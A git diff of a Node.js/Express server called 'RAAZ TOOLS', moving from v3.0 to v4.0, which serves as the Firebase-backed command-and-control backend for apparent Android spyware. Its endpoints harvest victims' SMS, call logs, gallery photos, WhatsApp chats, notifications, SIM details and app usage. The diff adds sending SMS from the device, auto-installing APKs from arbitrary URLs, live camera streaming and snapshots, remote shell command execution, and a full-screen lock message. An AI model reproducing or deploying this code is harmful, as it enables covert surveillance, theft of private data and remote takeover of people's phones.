@@ -1,11 +1,13 @@
 // ╔══════════════════════════════════════════════════════════════╗
-// ║           RAAZ TOOLS - SERVER v3.0 (Render Deploy)          ║
-// ║   All Features: SMS, Calls, Gallery, WhatsApp, APK,         ║
-// ║   Notifications, SIM, Battery, Toast Lock, Flashlight       ║
+// ║         RAAZ TOOLS - SERVER v4.0 (Render Deploy)            ║
+// ║  SMS Read+Send, Calls, Gallery Fix, WhatsApp, APK Auto,     ║
+// ║  Notifications, SIM, Battery, Toast Lock, Live Camera,      ║
+// ║  Internet CMD, Flashlight                                    ║
 // ╚══════════════════════════════════════════════════════════════╝
 
 const express = require('express');
 const admin   = require('firebase-admin');
+const http    = require('http');
 const app     = express();
 const PORT    = process.env.PORT || 3000;
 
@@ -13,13 +15,11 @@ const PORT    = process.env.PORT || 3000;
 const serviceAccount = require('./serviceAccountKey.json');
 admin.initializeApp({
   credential:  admin.credential.cert(serviceAccount),
-  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com' // ← apna URL
+  databaseURL: 'https://bgmiuc-74295-default-rtdb.firebaseio.com'
 });
-
 const db = admin.database();
-app.use(express.json({ limit: '50mb' }));
 
-// ─── CORS (optional, useful for web panel later) ─────────────────────────────
+app.use(express.json({ limit: '100mb' }));
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Methods', 'GET, POST, DELETE, OPTIONS');
@@ -28,16 +28,19 @@ app.use((req, res, next) => {
   next();
 });
 
-// ─── Helper: Wait for device response via Firebase ───────────────────────────
-async function waitForResponse(deviceId, requestType, requestId, timeout = 20000) {
+// ─── Camera MJPEG clients store ───────────────────────────────────────────────
+const cameraClients = {}; // deviceId → Set<res>
+
+// ─── Helper: Wait for Firebase response ──────────────────────────────────────
+function waitForResponse(deviceId, requestType, requestId, timeout = 20000) {
   const responseRef = db.ref(`responses/${deviceId}/${requestType}`);
   return new Promise((resolve, reject) => {
-    let responded = false;
-    const listener = responseRef.on('value', (snapshot) => {
-      if (!responded && snapshot.exists()) {
-        const data = snapshot.val();
+    let done = false;
+    const listener = responseRef.on('value', snap => {
+      if (!done && snap.exists()) {
+        const data = snap.val();
         if (data && data.requestId === requestId) {
-          responded = true;
+          done = true;
           clearTimeout(timer);
           responseRef.off('value', listener);
           responseRef.remove();
@@ -46,168 +49,160 @@ async function waitForResponse(deviceId, requestType, requestId, timeout = 20000
       }
     });
     const timer = setTimeout(() => {
-      if (!responded) {
-        responded = true;
+      if (!done) {
+        done = true;
         responseRef.off('value', listener);
-        reject(new Error(`Timeout: device did not respond in ${timeout}ms`));
+        reject(new Error(`Timeout after ${timeout}ms`));
       }
     }, timeout);
   });
 }
 
-// ─── Helper: Push command to device ──────────────────────────────────────────
+// ─── Helper: Push command ─────────────────────────────────────────────────────
 async function pushCommand(deviceId, command, extra = {}) {
-  const ref = await db.ref(`commands/${deviceId}`).push({
-    command,
-    ...extra,
-    timestamp: admin.database.ServerValue.TIMESTAMP,
-    status: 'pending'
-  });
+  const ref = db.ref(`commands/${deviceId}`).push();
+  await ref.set({ command, ...extra, timestamp: admin.database.ServerValue.TIMESTAMP, status: 'pending' });
   return ref.key;
 }
 
+// ─── Helper: Push request ─────────────────────────────────────────────────────
+async function pushRequest(deviceId, type, extra = {}) {
+  const requestId = Date.now().toString();
+  await db.ref(`requests/${deviceId}/${type}`).set({
+    requestId, ...extra, timestamp: admin.database.ServerValue.TIMESTAMP
+  });
+  return requestId;
+}
+
 // ════════════════════════════════════════════════════════════════
-//   ROOT — Health Check
+//   ROOT
 // ════════════════════════════════════════════════════════════════
 app.get('/', (req, res) => {
-  res.json({
-    status: '✅ RAAZ TOOLS Server Running',
-    version: '3.0',
-    endpoints: [
-      'GET  /api/devices',
-      'POST /api/register',
-      'POST /api/command',
-      'GET  /api/battery/:deviceId',
-      'POST /api/battery',
-      'GET  /api/sms/:deviceId',
-      'GET  /api/calls/:deviceId',
-      'GET  /api/gallery/:deviceId',
-      'GET  /api/whatsapp/:deviceId',
-      'GET  /api/installedApps/:deviceId',
-      'GET  /api/simInfo/:deviceId',
-      'POST /api/installApk',
-      'GET  /api/notifications/:deviceId',
-      'POST /api/notification',
-      'GET  /api/usage/:deviceId',
-      'POST /api/usage',
-      'POST /api/toast',
-      'POST /api/dismissToast',
-      'DELETE /api/device/:deviceId'
-    ]
-  });
+  res.json({ status: '✅ RAAZ TOOLS v4.0', message: 'All systems operational' });
 });
 
 // ════════════════════════════════════════════════════════════════
-//   DEVICE REGISTRATION & STATUS
+//   DEVICE MANAGEMENT
 // ════════════════════════════════════════════════════════════════
 app.post('/api/register', async (req, res) => {
   const { deviceId, info } = req.body;
   if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
   try {
     await db.ref(`onlineDevices/${deviceId}`).set({
-      info: info || {},
-      lastSeen: admin.database.ServerValue.TIMESTAMP,
-      online: true
+      info: info || {}, lastSeen: admin.database.ServerValue.TIMESTAMP, online: true
     });
     res.json({ status: 'registered', deviceId });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Get all online devices (online within last 2 minutes)
 app.get('/api/devices', async (req, res) => {
   try {
     const snapshot = await db.ref('onlineDevices').once('value');
     const devices = [];
     const now = Date.now();
     snapshot.forEach(child => {
-      const device = child.val();
-      const isOnline = (now - device.lastSeen) < 120000; // 2 min
-      if (isOnline) {
-        devices.push({ deviceId: child.key, info: device.info, lastSeen: device.lastSeen });
+      const d = child.val();
+      if ((now - d.lastSeen) < 120000) {
+        devices.push({ deviceId: child.key, info: d.info || {}, lastSeen: d.lastSeen });
       } else {
         child.ref.update({ online: false });
       }
     });
     res.json(devices);
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Delete/remove a device
+app.post('/api/heartbeat', async (req, res) => {
+  const { deviceId, info } = req.body;
+  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
+  try {
+    await db.ref(`onlineDevices/${deviceId}`).update({
+      lastSeen: admin.database.ServerValue.TIMESTAMP, online: true,
+      ...(info ? { info } : {})
+    });
+    res.json({ status: 'alive' });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
 app.delete('/api/device/:deviceId', async (req, res) => {
   try {
     await db.ref(`onlineDevices/${req.params.deviceId}`).remove();
     res.json({ status: 'removed' });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   SEND COMMAND (flashlight, custom commands, etc.)
+//   COMMANDS (generic + flashlight)
 // ════════════════════════════════════════════════════════════════
 app.post('/api/command', async (req, res) => {
   const { deviceId, command, extra } = req.body;
   if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
   try {
     const key = await pushCommand(deviceId, command, extra ? { extra } : {});
-    res.json({ status: 'queued', deviceId, command, key });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+    res.json({ status: 'queued', key });
+  } catch (e) { res.status(500).json({ error: e.message }); }
+});
+
+app.post('/api/flashlight', async (req, res) => {
+  const { deviceId, state } = req.body;
+  if (!deviceId || !state) return res.status(400).json({ error: 'deviceId and state required' });
+  try {
+    const key = await pushCommand(deviceId, `flashlight ${state}`);
+    res.json({ status: 'queued', key });
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
 //   BATTERY
 // ════════════════════════════════════════════════════════════════
-// Device posts battery status
 app.post('/api/battery', async (req, res) => {
   const { deviceId, level, charging } = req.body;
   if (!deviceId || level == null) return res.status(400).json({ error: 'Missing data' });
   try {
     await db.ref(`battery/${deviceId}`).push({
-      level,
-      charging: charging || false,
-      timestamp: admin.database.ServerValue.TIMESTAMP
+      level, charging: charging || false, timestamp: admin.database.ServerValue.TIMESTAMP
     });
     res.json({ status: 'logged' });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Get latest battery status
 app.get('/api/battery/:deviceId', async (req, res) => {
   try {
-    const snap = await db.ref(`battery/${req.params.deviceId}`)
-      .orderByKey().limitToLast(1).once('value');
+    const snap = await db.ref(`battery/${req.params.deviceId}`).orderByKey().limitToLast(1).once('value');
     let latest = null;
     snap.forEach(child => { latest = { id: child.key, ...child.val() }; });
     res.json(latest || { level: 0, charging: false });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   SMS
+//   SMS READ
 // ════════════════════════════════════════════════════════════════
 app.get('/api/sms/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
-  const requestId = Date.now().toString();
   try {
-    await db.ref(`requests/${deviceId}/sms`).set({
-      requestId,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
+    const requestId = await pushRequest(deviceId, 'sms');
     const response = await waitForResponse(deviceId, 'sms', requestId, 15000);
     res.json({ smsList: response.smsList || [] });
-  } catch (e) {
-    res.status(408).json({ error: e.message, smsList: [] });
-  }
+  } catch (e) { res.status(408).json({ error: e.message, smsList: [] }); }
+});
+
+// ════════════════════════════════════════════════════════════════
+//   📤 SMS SEND (NEW FEATURE)
+//   Android app uses SmsManager to send SMS
+// ════════════════════════════════════════════════════════════════
+app.post('/api/sms/send', async (req, res) => {
+  const { deviceId, to, message } = req.body;
+  if (!deviceId || !to || !message)
+    return res.status(400).json({ error: 'deviceId, to, message required' });
+  try {
+    const requestId = Date.now().toString();
+    await db.ref(`requests/${deviceId}/sendSms`).set({
+      requestId, to, message, timestamp: admin.database.ServerValue.TIMESTAMP
+    });
+    const result = await waitForResponse(deviceId, 'sendSms', requestId, 15000);
+    res.json({ status: result.status || 'sent', result: result.result, requestId });
+  } catch (e) { res.status(408).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
@@ -215,53 +210,36 @@ app.get('/api/sms/:deviceId', async (req, res) => {
 // ════════════════════════════════════════════════════════════════
 app.get('/api/calls/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
-  const requestId = Date.now().toString();
   try {
-    await db.ref(`requests/${deviceId}/calls`).set({
-      requestId,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
+    const requestId = await pushRequest(deviceId, 'calls');
     const response = await waitForResponse(deviceId, 'calls', requestId, 15000);
     res.json({ callList: response.callList || [] });
-  } catch (e) {
-    res.status(408).json({ error: e.message, callList: [] });
-  }
+  } catch (e) { res.status(408).json({ error: e.message, callList: [] }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   GALLERY IMAGES
+//   GALLERY IMAGES (Fixed with proper chunking support)
 // ════════════════════════════════════════════════════════════════
 app.get('/api/gallery/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
-  const requestId = Date.now().toString();
+  const count = parseInt(req.query.count) || 5;
   try {
-    await db.ref(`requests/${deviceId}/gallery`).set({
-      requestId,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
-    const response = await waitForResponse(deviceId, 'gallery', requestId, 20000);
+    const requestId = await pushRequest(deviceId, 'gallery', { count });
+    const response = await waitForResponse(deviceId, 'gallery', requestId, 30000);
     res.json({ images: response.images || [] });
-  } catch (e) {
-    res.status(408).json({ error: e.message, images: [] });
-  }
+  } catch (e) { res.status(408).json({ error: e.message, images: [] }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   WHATSAPP CHATS
+//   WHATSAPP
 // ════════════════════════════════════════════════════════════════
 app.get('/api/whatsapp/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
-  const requestId = Date.now().toString();
   try {
-    await db.ref(`requests/${deviceId}/whatsapp`).set({
-      requestId,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
+    const requestId = await pushRequest(deviceId, 'whatsapp');
     const response = await waitForResponse(deviceId, 'whatsapp', requestId, 15000);
     res.json({ chats: response.chats || [] });
-  } catch (e) {
-    res.status(408).json({ error: e.message, chats: [] });
-  }
+  } catch (e) { res.status(408).json({ error: e.message, chats: [] }); }
 });
 
 // ════════════════════════════════════════════════════════════════
@@ -269,17 +247,11 @@ app.get('/api/whatsapp/:deviceId', async (req, res) => {
 // ════════════════════════════════════════════════════════════════
 app.get('/api/installedApps/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
-  const requestId = Date.now().toString();
   try {
-    await db.ref(`requests/${deviceId}/installedApps`).set({
-      requestId,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
+    const requestId = await pushRequest(deviceId, 'installedApps');
     const response = await waitForResponse(deviceId, 'installedApps', requestId, 15000);
     res.json({ apps: response.apps || [] });
-  } catch (e) {
-    res.status(408).json({ error: e.message, apps: [] });
-  }
+  } catch (e) { res.status(408).json({ error: e.message, apps: [] }); }
 });
 
 // ════════════════════════════════════════════════════════════════
@@ -287,90 +259,66 @@ app.get('/api/installedApps/:deviceId', async (req, res) => {
 // ════════════════════════════════════════════════════════════════
 app.get('/api/simInfo/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
-  const requestId = Date.now().toString();
   try {
-    await db.ref(`requests/${deviceId}/simInfo`).set({
-      requestId,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
+    const requestId = await pushRequest(deviceId, 'simInfo');
     const response = await waitForResponse(deviceId, 'simInfo', requestId, 15000);
     res.json({ simList: response.simList || [] });
-  } catch (e) {
-    res.status(408).json({ error: e.message, simList: [] });
-  }
+  } catch (e) { res.status(408).json({ error: e.message, simList: [] }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   INSTALL APK (Download + Install on device)
+//   APK AUTO DOWNLOAD + INSTALL
 // ════════════════════════════════════════════════════════════════
 app.post('/api/installApk', async (req, res) => {
   const { deviceId, url } = req.body;
   if (!deviceId || !url) return res.status(400).json({ error: 'deviceId and url required' });
-  const requestId = Date.now().toString();
   try {
-    await db.ref(`requests/${deviceId}/installApk`).set({
-      requestId,
-      url,
-      timestamp: admin.database.ServerValue.TIMESTAMP
-    });
-    // Longer timeout since APK needs to download first
-    const response = await waitForResponse(deviceId, 'installApk', requestId, 60000);
+    const requestId = await pushRequest(deviceId, 'installApk', { url, autoInstall: true });
+    const response = await waitForResponse(deviceId, 'installApk', requestId, 90000);
     res.json({ status: 'success', result: response.result });
   } catch (e) {
-    // Still queued even on timeout — download may still be happening
-    res.status(202).json({ status: 'queued', message: 'APK download initiated on device', error: e.message });
+    res.status(202).json({ status: 'queued', message: 'APK download started on device. Install prompt will appear.', error: e.message });
   }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   NOTIFICATIONS — Get recent from Firebase
+//   NOTIFICATIONS
 // ════════════════════════════════════════════════════════════════
 app.get('/api/notifications/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
   const limit = parseInt(req.query.limit) || 20;
   try {
-    const snap = await db.ref(`notifications/${deviceId}`)
-      .orderByKey().limitToLast(limit).once('value');
+    const snap = await db.ref(`notifications/${deviceId}`).orderByKey().limitToLast(limit).once('value');
     const notifs = [];
     snap.forEach(child => notifs.push({ id: child.key, ...child.val() }));
-    res.json(notifs.reverse()); // Latest first
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+    res.json(notifs.reverse());
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Device posts a new notification
 app.post('/api/notification', async (req, res) => {
   const { deviceId, packageName, title, text, timestamp } = req.body;
   if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
   try {
     await db.ref(`notifications/${deviceId}`).push({
-      packageName,
-      title:     title || '',
-      text:      text || '',
+      packageName, title: title || '', text: text || '',
       timestamp: timestamp || admin.database.ServerValue.TIMESTAMP
     });
     res.json({ status: 'logged' });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   APP USAGE LOGS
+//   APP USAGE
 // ════════════════════════════════════════════════════════════════
 app.get('/api/usage/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
   const limit = parseInt(req.query.limit) || 20;
   try {
-    const snap = await db.ref(`usage/${deviceId}`)
-      .orderByKey().limitToLast(limit).once('value');
+    const snap = await db.ref(`usage/${deviceId}`).orderByKey().limitToLast(limit).once('value');
     const usage = [];
     snap.forEach(child => usage.push({ id: child.key, ...child.val() }));
     res.json(usage.reverse());
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 app.post('/api/usage', async (req, res) => {
@@ -378,59 +326,131 @@ app.post('/api/usage', async (req, res) => {
   if (!deviceId || !packageName) return res.status(400).json({ error: 'Missing data' });
   try {
     await db.ref(`usage/${deviceId}`).push({
-      packageName,
-      appName:   appName || packageName,
+      packageName, appName: appName || packageName,
       timestamp: admin.database.ServerValue.TIMESTAMP
     });
     res.json({ status: 'logged' });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   🔥 TOAST / FULL SCREEN LOCK MESSAGE
+//   TOAST / LOCK SCREEN
 // ════════════════════════════════════════════════════════════════
-// Send a full-screen blocking message to device
 app.post('/api/toast', async (req, res) => {
   const { deviceId, message } = req.body;
   if (!deviceId || !message) return res.status(400).json({ error: 'deviceId and message required' });
   try {
     const key = await pushCommand(deviceId, 'showToast', { extra: message });
-    res.json({ status: 'sent', key, message });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+    res.json({ status: 'sent', key });
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
-// Dismiss the full-screen lock message
 app.post('/api/dismissToast', async (req, res) => {
   const { deviceId } = req.body;
   if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
   try {
     const key = await pushCommand(deviceId, 'dismissToast');
     res.json({ status: 'dismiss sent', key });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   FLASHLIGHT (via command endpoint)
+//   📷 LIVE CAMERA — MJPEG Stream
+//
+//   Android app posts JPEG frames → server broadcasts to all viewers
+//   Termux views: mpv http://server/api/camera/stream/:deviceId
+//   Or saves frames with curl
 // ════════════════════════════════════════════════════════════════
-app.post('/api/flashlight', async (req, res) => {
-  const { deviceId, state } = req.body; // state: 'on' or 'off'
-  if (!deviceId || !state) return res.status(400).json({ error: 'deviceId and state required' });
+
+// Termux / browser opens this URL to view live stream
+app.get('/api/camera/stream/:deviceId', async (req, res) => {
+  const { deviceId } = req.params;
+  const camera = req.query.camera || 'back';
+
+  res.writeHead(200, {
+    'Content-Type':  'multipart/x-mixed-replace; boundary=RAAZFRAME',
+    'Cache-Control': 'no-cache, no-store',
+    'Connection':    'keep-alive',
+    'Pragma':        'no-cache',
+    'Access-Control-Allow-Origin': '*'
+  });
+
+  if (!cameraClients[deviceId]) cameraClients[deviceId] = new Set();
+  cameraClients[deviceId].add(res);
+  console.log(`📷 Viewer connected for ${deviceId} (${camera}) — total: ${cameraClients[deviceId].size}`);
+
+  // Tell device to start camera streaming
+  await pushCommand(deviceId, 'startCamera', { camera, intervalMs: 400 }).catch(() => {});
+
+  req.on('close', async () => {
+    if (cameraClients[deviceId]) {
+      cameraClients[deviceId].delete(res);
+      if (cameraClients[deviceId].size === 0) {
+        delete cameraClients[deviceId];
+        await pushCommand(deviceId, 'stopCamera').catch(() => {});
+        console.log(`📷 All viewers disconnected for ${deviceId} — camera stopped`);
+      }
+    }
+  });
+});
+
+// Android app posts JPEG frames here
+app.post('/api/camera/frame', (req, res) => {
+  const { deviceId, frameBase64 } = req.body;
+  if (!deviceId || !frameBase64) return res.status(400).json({ error: 'Missing data' });
+
+  const clients = cameraClients[deviceId];
+  if (clients && clients.size > 0) {
+    const frame = Buffer.from(frameBase64, 'base64');
+    const header = `\r\n--RAAZFRAME\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.length}\r\n\r\n`;
+    const toRemove = [];
+    clients.forEach(clientRes => {
+      try {
+        clientRes.write(header);
+        clientRes.write(frame);
+      } catch (e) {
+        toRemove.push(clientRes);
+      }
+    });
+    toRemove.forEach(r => clients.delete(r));
+    res.json({ status: 'ok', viewers: clients.size });
+  } else {
+    res.json({ status: 'no_viewers', viewers: 0 });
+  }
+});
+
+// Single snapshot
+app.get('/api/camera/snapshot/:deviceId', async (req, res) => {
+  const { deviceId } = req.params;
+  const camera = req.query.camera || 'back';
   try {
-    const key = await pushCommand(deviceId, `flashlight ${state}`);
-    res.json({ status: 'queued', key });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+    const requestId = await pushRequest(deviceId, 'snapshot', { camera });
+    const response = await waitForResponse(deviceId, 'snapshot', requestId, 15000);
+    if (response.imageBase64) {
+      res.set('Content-Type', 'image/jpeg');
+      res.send(Buffer.from(response.imageBase64, 'base64'));
+    } else {
+      res.status(500).json({ error: 'No image' });
+    }
+  } catch (e) { res.status(408).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   CLEAR ALL DATA FOR DEVICE (utility)
+//   🌐 INTERNET / SHELL CMD
+//   Device runs the command and returns output
+// ════════════════════════════════════════════════════════════════
+app.post('/api/cmd', async (req, res) => {
+  const { deviceId, command } = req.body;
+  if (!deviceId || !command) return res.status(400).json({ error: 'deviceId and command required' });
+  try {
+    const requestId = await pushRequest(deviceId, 'cmd', { command });
+    const response = await waitForResponse(deviceId, 'cmd', requestId, 25000);
+    res.json({ output: response.output || '', exitCode: response.exitCode || 0 });
+  } catch (e) { res.status(408).json({ error: e.message, output: '' }); }
+});
+
+// ════════════════════════════════════════════════════════════════
+//   CLEAR QUEUE
 // ════════════════════════════════════════════════════════════════
 app.delete('/api/clear/:deviceId', async (req, res) => {
   const { deviceId } = req.params;
@@ -442,35 +462,21 @@ app.delete('/api/clear/:deviceId', async (req, res) => {
       db.ref(`results/${deviceId}`).remove(),
     ]);
     res.json({ status: 'cleared', deviceId });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
+  } catch (e) { res.status(500).json({ error: e.message }); }
 });
 
 // ════════════════════════════════════════════════════════════════
-//   HEARTBEAT — device sends ping every 30s
+//   START
 // ════════════════════════════════════════════════════════════════
-app.post('/api/heartbeat', async (req, res) => {
-  const { deviceId, info } = req.body;
-  if (!deviceId) return res.status(400).json({ error: 'deviceId required' });
-  try {
-    await db.ref(`onlineDevices/${deviceId}`).update({
-      lastSeen: admin.database.ServerValue.TIMESTAMP,
-      online: true,
-      ...(info ? { info } : {})
-    });
-    res.json({ status: 'alive' });
-  } catch (e) {
-    res.status(500).json({ error: e.message });
-  }
-});
-
-// ════════════════════════════════════════════════════════════════
-//   START SERVER
-// ════════════════════════════════════════════════════════════════
-app.listen(PORT, () => {
-  console.log(`\n╔═══════════════════════════════════════╗`);
-  console.log(`║   ✅  RAAZ TOOLS SERVER v3.0          ║`);
-  console.log(`║   🚀  Running on port ${PORT}             ║`);
-  console.log(`╚═══════════════════════════════════════╝\n`);
+const server = http.createServer(app);
+server.listen(PORT, () => {
+  console.log(`
+╔══════════════════════════════════════════╗
+║   ✅  RAAZ TOOLS SERVER v4.0            ║
+║   🚀  Port     : ${PORT}                    ║
+║   📷  Camera   : MJPEG Live Stream      ║
+║   📤  SMS Send : Active                 ║
+║   🌐  Internet CMD : Active             ║
+║   🔥  Toast Lock : Active               ║
+╚══════════════════════════════════════════╝`);
 });
